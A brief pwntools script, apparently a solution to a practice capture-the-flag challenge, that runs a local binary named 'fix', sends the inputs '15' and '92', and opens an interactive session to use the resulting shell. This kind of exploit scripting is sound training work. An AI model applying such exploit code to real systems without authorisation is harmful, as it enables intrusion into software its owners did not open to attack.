#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

p = process("/home/fix/fix")
p.recvline()
p.recvline()
p.sendline("15")
log.success("send 15")
p.recv()
p.send("92")
log.success("send 92")
p.interactive()
p.close()
